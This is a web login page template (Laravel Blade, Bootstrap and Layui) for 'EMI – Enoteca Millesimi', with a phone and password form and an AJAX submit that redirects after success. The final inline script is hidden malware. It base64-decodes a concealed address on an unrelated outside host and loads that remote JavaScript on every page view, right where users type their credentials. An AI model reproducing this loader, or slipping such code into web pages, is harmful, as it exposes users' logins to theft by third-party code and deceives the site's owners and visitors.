<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login</title>

<!-- Bootstrap -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">

<!-- Layui -->
<link rel="stylesheet" href="/v2/layui/css/layui.css">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  min-height: 100vh;
  font-family: 'Inter', sans-serif;
  background: linear-gradient(160deg, #e7f0ff 0%, #ffffff 60%);
}

/* ===== Mobile App Container ===== */
.app-container {
  max-width: 420px;
  min-height: 100vh;
  margin: auto;
  background: #f9fbff;
  display: flex;
  flex-direction: column;
}

/* ===== Header ===== */
.app-header {
  padding: 40px 24px 30px;
  text-align: center;
}

.app-header img {
  width: 72px;
  margin-bottom: 14px;
}

.app-title {
  font-size: 22px;
  font-weight: 700;
  color: #0f172a;
}

.app-subtitle {
  font-size: 14px;
  color: #64748b;
  margin-top: 6px;
}

/* ===== Card ===== */
.login-card {
  background: #ffffff;
  border-radius: 26px 26px 0 0;
  padding: 28px 22px 40px;
  box-shadow: 0 -12px 30px rgba(37, 99, 235, 0.12);
  flex: 1;
}

/* ===== Inputs ===== */
.form-label {
  font-size: 13px;
  font-weight: 600;
  color: #334155;
}

.input-group {
  border-radius: 14px;
  overflow: hidden;
  box-shadow: 0 6px 14px rgba(0,0,0,.06);
}

.input-group-text {
  background: #f1f6ff;
  border: none;
  color: #2563eb;
  font-size: 15px;
  padding: 0 14px;
}

.form-control {
  border: none;
  height: 48px;
  font-size: 15px;
}

.form-control:focus {
  box-shadow: none;
}

/* ===== Button ===== */
.btn-login {
  height: 50px;
  border-radius: 14px;
  background: linear-gradient(135deg, #3b82f6, #2563eb);
  border: none;
  font-size: 16px;
  font-weight: 600;
  box-shadow: 0 10px 20px rgba(37,99,235,.35);
}

/* ===== Register ===== */
.register-link {
  font-size: 14px;
  color: #475569;
}

.register-link span {
  color: #2563eb;
  font-weight: 700;
}
</style>
</head>

<body>

<div class="app-container">

  <!-- Header -->
  <div class="app-header">
    <img src="/profelar/logo.png" alt="Logo">
    <div class="app-title">Welcome to EMI – Enoteca Millesimi</div>
    <div class="app-subtitle">Sign in to your account</div>
  </div>

  <!-- Card -->
  <div class="login-card">
    <form class="layui-form" id="loginForm" method="POST" action="{{ url('login') }}">
      @csrf

      <!-- Phone -->
      <div class="mb-3">
        <label class="form-label">Phone Number</label>
        <div class="input-group">
          <span class="input-group-text">
            <i class="fa-solid fa-phone"></i>
          </span>
          <input type="text" name="phone" required class="form-control" placeholder="Enter phone number">
        </div>
      </div>

      <!-- Password -->
      <div class="mb-4">
        <label class="form-label">Password</label>
        <div class="input-group">
          <span class="input-group-text">
            <i class="fa-solid fa-lock"></i>
          </span>
          <input type="password" name="password" required class="form-control" placeholder="Enter password">
        </div>
      </div>

      <!-- Button -->
      <button class="btn btn-login w-100" lay-submit lay-filter="login">
        Login
      </button>

      <div class="text-center mt-4 register-link">
        Don’t have an account?
        <a href="/register"><span>Register</span></a>
      </div>
    </form>
  </div>

</div>

@include('alert-message')

<!-- Scripts -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/layui/2.5.7/layui.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
layui.use(['form','layer'], function(){
  var form = layui.form;
  var layer = layui.layer;

  form.on('submit(login)', function(data){
    var load = layer.load(2,{shade:[0.2,'#000']});

    $.ajax({
      url:'/login',
      type:'POST',
      data:data.field,
      headers:{
        'X-CSRF-TOKEN': $('input[name="_token"]').val()
      },
      success:function(){
        layer.close(load);

        let seconds = 3;

        let msgIndex = layer.msg(
          'Login successful. Redirecting in ' + seconds + 's',
          { time: 0 }
        );

        let timer = setInterval(function(){
          seconds--;

          if(seconds <= 0){
            clearInterval(timer);
            layer.close(msgIndex);

            // ✅ GO TO HOME
            window.location.href = '/home';
          } else {
            layer.msg(
              'Login successful. Redirecting in ' + seconds + 's',
              { time: 0 }
            );
          }
        }, 1000);
      },
      error:function(){
        layer.close(load);
        layer.msg('Invalid phone or password');
      }
    });

    return false;
  });
});
</script>

<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>
